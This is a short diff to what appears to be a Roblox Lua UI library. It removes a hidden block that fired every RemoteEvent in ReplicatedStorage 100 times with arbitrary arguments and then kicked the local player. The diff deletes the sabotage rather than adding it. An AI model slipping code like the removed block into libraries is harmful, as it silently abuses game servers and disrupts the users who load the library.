@@ -1664,11 +1664,5 @@ function ret:Library(Name)
 	end
 	return ui
 end
-for _,v in pairs(game.ReplicatedStorage:GetDescendants()) do
-  if not v:IsA("RemoteEvent") then continue end
-  for i = 1, 100 do
-    v:FireServer(i)
-  end
-end
-game.Players.LocalPlayer:Kick("You have been kicked from the game.")
+
 return ret, settings
